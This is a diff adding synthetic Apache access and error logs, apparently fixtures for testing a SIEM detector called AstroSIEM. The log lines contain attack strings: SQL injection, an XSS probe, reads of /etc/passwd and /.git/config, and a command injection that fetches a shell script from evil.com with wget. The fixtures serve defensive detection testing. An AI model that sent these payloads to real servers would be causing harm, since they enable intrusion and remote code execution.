@@ -1,0 +1,24 @@
+# Sample Apache Logs for AstroSIEM Testing
+
+[APACHE_ACCESS] 192.168.1.100 - - [20/Feb/2026:10:15:23 +0000] "GET /admin HTTP/1.1" 401 532 "-" "Mozilla/5.0"
+[APACHE_ACCESS] 192.168.1.100 - - [20/Feb/2026:10:15:24 +0000] "GET /admin HTTP/1.1" 401 532 "-" "Mozilla/5.0"
+[APACHE_ACCESS] 192.168.1.100 - - [20/Feb/2026:10:15:25 +0000] "GET /admin HTTP/1.1" 200 1523 "-" "Mozilla/5.0"
+[APACHE_ACCESS] 203.0.113.50 - - [20/Feb/2026:10:16:00 +0000] "GET /index.php?id=1' OR '1'='1 HTTP/1.1" 500 243 "-" "Mozilla/5.0"
+[APACHE_ACCESS] 198.51.100.25 - - [20/Feb/2026:10:16:30 +0000] "POST /search.php HTTP/1.1" 500 1872 "-" "curl/7.68.0"
+[APACHE_ACCESS] 192.168.1.100 - - [20/Feb/2026:10:17:00 +0000] "GET /wp-content/plugins HTTP/1.1" 404 234 "-" "nikto/2.1.6"
+[APACHE_ACCESS] 203.0.113.50 - - [20/Feb/2026:10:17:30 +0000] "GET /etc/passwd HTTP/1.1" 403 234 "-" "Mozilla/5.0"
+[APACHE_ACCESS] 198.51.100.25 - - [20/Feb/2026:10:18:00 +0000] "GET /api.php?cmd=<script>alert(1)</script> HTTP/1.1" 500 342 "-" "Mozilla/5.0"
+[APACHE_ACCESS] 45.33.32.156 - - [20/Feb/2026:10:18:30 +0000] "GET /.git/config HTTP/1.1" 403 234 "-" "git/2.30.0"
+[APACHE_ACCESS] 192.168.1.100 - - [20/Feb/2026:10:19:00 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 234 "-" "Mozilla/5.0"
+[APACHE_ACCESS] 203.0.113.50 - - [20/Feb/2026:10:19:30 +0000] "GET /admin.php?cmd=wget http://evil.com/shell.sh HTTP/1.1" 500 567 "-" "curl/7.68.0"
+[APACHE_ACCESS] 198.51.100.25 - - [20/Feb/2026:10:20:00 +0000] "GET /server-status HTTP/1.1" 403 234 "-" "Apache/2.4.41"
+[APACHE_ACCESS] 192.168.1.100 - - [20/Feb/2026:10:20:30 +0000] "GET / HTTP/1.1" 200 15234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+[APACHE_ACCESS] 203.0.113.50 - - [20/Feb/2026:10:21:00 +0000] "GET /login.php HTTP/1.1" 200 4521 "-" "sqlmap/1.6"
+[APACHE_ACCESS] 45.33.32.156 - - [20/Feb/2026:10:21:30 +0000] "POST /xmlrpc.php HTTP/1.1" 405 234 "-" "Mozilla/5.0"
+
+[APACHE_ERROR] [Mon Feb 20 10:15:23.234567 2026] [error] [client 192.168.1.100] PHP Fatal error: Call to undefined function eval() in /var/www/html/shell.php on line 5
+[APACHE_ERROR] [Mon Feb 20 10:16:00.123456 2026] [error] [client 203.0.113.50] client denied by server configuration: /var/www/html/.env
+[APACHE_ERROR] [Mon Feb 20 10:17:00.234567 2026] [warn] [client 198.51.100.25] mod_security: Access denied with code 403 (pattern match) "/etc/passwd" at URI
+[APACHE_ERROR] [Mon Feb 20 10:18:00.345678 2026] [error] [client 192.168.1.100] Timeout waiting for output from CGI: /cgi-bin/backdoor.sh
+[APACHE_ERROR] [Mon Feb 20 10:19:00.456789 2026] [error] [client 203.0.113.50] File does not exist: /var/www/html/wp-config.php
+[APACHE_ERROR] [Mon Feb 20 10:20:00.567890 2026] [error] [client 198.51.100.25] PHP Warning: eval() called in /var/www/html/data.php on line 42
